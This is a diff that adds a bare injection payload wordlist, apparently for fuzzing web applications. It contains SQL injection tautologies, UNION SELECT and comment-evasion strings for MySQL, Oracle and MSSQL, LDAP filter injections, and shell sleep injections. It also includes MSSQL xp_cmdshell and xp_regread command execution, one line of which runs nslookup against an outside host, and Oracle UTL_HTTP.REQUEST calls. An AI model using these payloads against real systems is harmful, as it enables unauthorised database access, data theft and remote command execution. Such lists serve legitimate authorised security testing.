@@ -1,0 +1,161 @@
+ and 1=1
+ and 2=0
+ and 2=0#mysql
+ and 2=0-- oracle_mysql
+ and 2=2#mysql
+ and 2=2-- oracle_mysql
+ and user()=user()
+ and USER=USER
+ or 2=2
+!
+"
+" or "a"="a
+" or 0=0 #
+" or 0=0 --
+" or 1=1 or ""="
+" or 1=1#
+" or 1=1--
+"%20or%20"x"="x
+"' or 1 --'"
+") or ("a"="a
+#
+#mysql
+%20$(sleep%2050)
+%20'sleep%2050'
+%21
+%26
+%27%20or%201=1
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+&
+&apos;%20OR
+&lt;&gt;&quot;'%;)(&amp;+
+'
+' (select top 1
+' and '2'='0
+' and '2'='0'#mysql
+' and '2'='0'-- oracle
+' and '2'='2
+' and '2'='2'#mysql
+' and '2'='2'-- oracle
+' or ''='
+' or '1'='1'--
+' or '2'='2
+' or (EXISTS)
+' or 0=0 #
+' or 0=0 --
+' or 1=1 or ''='
+' or 1=1--
+' or a=a--
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+' UNION ALL SELECT
+' UNION SELECT
+'#mysql
+'%20--
+'%20;
+'%20or%20''='
+'%20or%20'x'='x
+'%20or%201=1
+') or ('a'='a
+')%20or%20('x'='x
+'/*ora_mysql*/and/**/'2'='0
+'/*ora_mysql*/and/**/'2'='2
+'/*ora_mysql*/or/**/'2'='2
+'; exec master..xp_cmdshell
+'; exec xp_regread
+'hi' or 'x'='x';
+'or%20select *
+'sqlattempt1
+'test
+'test--
+'||UTL_HTTP.REQUEST
+(
+(sqlattempt2)
+)
+*(|(mail=*))
+*(|(objectclass=*))
+*/*
+*|
+,@variable
+-
+--
+--';
+--ora_sqls
+--sp_password
+/
+/*ora_mysql*/and/**/2=0
+/*ora_mysql*/and/**/2=2
+//
+//*
+0 or 1=1
+1;SELECT%20*
+1e100
+2 or 2=2
+2' or '2'='2
+999999999999999999
+<>"'%;)(&+
+=%20'
+=%20--
+=%20;
+@variable
+\x23
+\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+\x27UNION SELECT
+\x3D%20\x27
+\x3D%20\x3B'
+admin'
+admin'#
+admin'--
+as
+asc
+bfilename
+char%4039%41%2b%40SELECT
+delete
+desc
+distinct
+exec sp
+exec xp
+handler
+having
+hi" or "a"="a
+hi" or 1=1 --
+hi") or ("a"="a
+hi' or 'a'='a
+hi' or 1=1 --
+hi') or ('a'='a
+insert
+like
+limit
+now()
+or
+or 0=0 #
+or 0=0 --
+or 1=1
+or 1=1#
+or 1=1--
+or%201=1
+or%201=1 --
+order by
+order by 1--
+PRINT
+PRINT @@variable
+procedure
+replace
+select
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+to_timestamp_tz
+truncate
+tz_offset
+update
+x' or 1=1 or 'x'='y
+|
